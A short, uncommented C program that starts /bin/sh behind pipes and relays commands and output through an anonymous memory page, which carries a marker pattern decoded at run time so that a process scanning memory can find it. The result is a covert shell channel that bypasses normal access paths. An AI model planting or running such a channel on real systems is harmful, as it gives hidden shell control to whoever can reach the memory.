#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>

#pragma pack(1)

#define BUFFER_SIZE 255
#define PATTERN_SIZE 16
#define CACHE_SIZE ( 10 * 1024 * 1024 )
#define SEND_MASTER '^'
#define SEND_SLAVE '~'

struct msg {
	char pattern[PATTERN_SIZE];
	volatile char flags;
	volatile unsigned char len;
	char data[BUFFER_SIZE];
};
typedef struct msg message;

message* initMessage(){
	int i;
	message *p;

	p = mmap(NULL,sizeof(message),PROT_WRITE|PROT_READ,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
	if(p == (void*)-1)
		puts("mmap failed");

	memcpy(p->pattern,"81d2ec67g412df64",PATTERN_SIZE);

	for(i=0;i<PATTERN_SIZE;i++)
		p->pattern[i]-=1;

	p->flags = SEND_SLAVE;
	return p;
}

void blockMessage(message *m){
	while(1)
		if(m->flags != SEND_SLAVE)
			return;
}

int main(int argc,char **argv){
	int fdstdin[2];
	int fdstdout[2];
	int oldstdin;
	int oldstdout;
	message* m;
	m = initMessage();
	if(pipe(fdstdin))
		perror("creating pipe failed");
	
	if(pipe(fdstdout))
		perror("creating pipe failed");

	fcntl(fdstdin[0],F_SETFL,O_NONBLOCK);	
	fcntl(fdstdin[1],F_SETFL,O_NONBLOCK);	
	fcntl(fdstdout[0],F_SETFL,O_NONBLOCK);	
	fcntl(fdstdout[1],F_SETFL,O_NONBLOCK);	
	
	oldstdin=dup(fileno(stdin));
	close(fileno(stdin));

	oldstdout=dup(fileno(stdout));
	close(fileno(stdout));

	dup2(fdstdin[0], fileno(stdin));
	dup2(fdstdout[1], fileno(stdout));
		
	if(fork()){
		//parent
		dup2(oldstdin, fileno(stdin));
		dup2(oldstdout, fileno(stdout));

		while(1){
			int len;
			blockMessage(m);
			write(fdstdin[1], m->data, m->len);
			write(fileno(stdout), m->data, m->len);
			if ((len = read(fdstdout[0], m->data, BUFFER_SIZE)) == -1)
				m->len = 0;
			else
				m->len = len;
			
			m->flags = SEND_SLAVE;
			puts ("###################################");
		}
	}else{
		//child
		char *args = NULL;
		dup2(fileno(stdout), fileno(stderr));
		execvp("/bin/sh",&args);
	}
	return 0;	
}

